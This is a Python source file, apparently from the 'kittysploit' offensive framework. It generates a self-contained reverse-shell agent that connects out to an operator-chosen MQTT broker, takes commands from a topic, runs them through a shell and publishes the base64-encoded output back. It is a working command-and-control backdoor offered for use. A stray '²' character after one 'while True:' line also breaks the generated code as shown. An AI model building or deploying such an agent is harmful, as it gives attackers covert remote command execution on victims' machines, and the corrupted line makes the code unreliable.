#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Minimal MQTT 3.1.1 client helpers (stdlib) for reverse-shell agents."""

from __future__ import annotations


def build_mqtt_reverse_agent_script(
    host: str,
    port: int,
    client_id: str,
    *,
    base_topic: str = "kittysploit/c2",
    username: str = "",
    password: str = "",
    poll_timeout: float = 2.0,
) -> str:
    """Return a self-contained Python agent compatible with reverse_mqtt_shell.

    Protocol:
      subscribe  {base}/{client_id}/cmd
      publish    {base}/{client_id}/result  JSON {{output, encoding}}
    """
    base = str(base_topic or "kittysploit/c2").rstrip("/")
    return f"""
import base64,json,os,socket,struct,subprocess,time
HOST={host!r};PORT={int(port)};CID={client_id!r};BASE={base!r}
USER={username!r};PASS={password!r};TIMEOUT={float(poll_timeout)}
CMD_TOPIC=BASE+'/'+CID+'/cmd'; RES_TOPIC=BASE+'/'+CID+'/result'

def _enc_str(s):
  b=s.encode('utf-8'); return struct.pack('!H',len(b))+b

def _pkt(mtype, vh=b'', payload=b'', flags=0):
  rem=len(vh)+len(payload); hdr=bytes([(mtype<<4)|flags])
  while True:²
    enc=rem % 128; rem//=128
    if rem: enc|=0x80
    hdr+=bytes([enc])
    if not rem: break
  return hdr+vh+payload

def _read_packet(sock):
  def rbyte():
    b=sock.recv(1)
    if not b: raise OSError('closed')
    return b[0]
  first=rbyte(); rem=0; mul=1
  while True:
    enc=rbyte(); rem+=(enc&0x7f)*mul; mul*=128
    if not (enc&0x80): break
  data=b''
  while len(data)<rem:
    chunk=sock.recv(rem-len(data))
    if not chunk: raise OSError('closed')
    data+=chunk
  return first>>4, first&0x0f, data

def _connect(sock):
  proto=_enc_str('MQTT')+bytes([4])  # 3.1.1
  flags=0x02  # clean session
  if USER: flags|=0x80
  if PASS: flags|=0x40
  vh=proto+bytes([flags])+struct.pack('!H',60)+_enc_str(CID)
  if USER: vh+=_enc_str(USER)
  if PASS: vh+=_enc_str(PASS)
  sock.sendall(_pkt(1, vh))
  t,_,_= _read_packet(sock)
  if t!=2: raise OSError('CONNACK failed')

def _subscribe(sock, topic, mid=1):
  vh=struct.pack('!H',mid)+_enc_str(topic)+bytes([0])
  sock.sendall(_pkt(8, vh, flags=2))
  t,_,_= _read_packet(sock)
  if t!=9: raise OSError('SUBACK failed')

def _publish(sock, topic, payload):
  body=_enc_str(topic)+payload
  sock.sendall(_pkt(3, body, flags=0))

def _run(cmd):
  try:
    p=subprocess.run(cmd,shell=True,capture_output=True,timeout=120)
    out=(p.stdout or b'')+(p.stderr or b'')
    if not out: out=('exit %s\\n'%p.returncode).encode()
    return out.decode('utf-8','replace')
  except Exception as e:
    return 'ERROR:%s'%e

sock=socket.create_connection((HOST,PORT),timeout=20)
sock.settimeout(TIMEOUT)
_connect(sock); _subscribe(sock, CMD_TOPIC)
while True:
  try:
    t,flags,data=_read_packet(sock)
  except socket.timeout:
    # MQTT keepalive ping
    try: sock.sendall(_pkt(12))
    except Exception: break
    continue
  except Exception:
    break
  if t==13:  # PINGRESP
    continue
  if t==3:  # PUBLISH
    if len(data)<2: continue
    tlen=struct.unpack('!H',data[:2])[0]
    topic=data[2:2+tlen].decode('utf-8','replace')
    payload=data[2+tlen:]
    if (flags>>1)&0x03:  # qos>0 skip packet id
      if len(payload)<2: continue
      payload=payload[2:]
    if topic!=CMD_TOPIC: continue
    try:
      msg=json.loads(payload.decode('utf-8','replace') or '{{}}')
      cmd=msg.get('command','')
      if msg.get('encoding')=='base64':
        cmd=base64.b64decode(cmd).decode('utf-8','replace')
    except Exception:
      cmd=payload.decode('utf-8','replace')
    if not str(cmd).strip(): continue
    out=_run(str(cmd))
    body=json.dumps({{'output':base64.b64encode(out.encode()).decode(),'encoding':'base64','id':CID}}).encode()
    try: _publish(sock, RES_TOPIC, body)
    except Exception: break
try: sock.close()
except Exception: pass
""".strip()
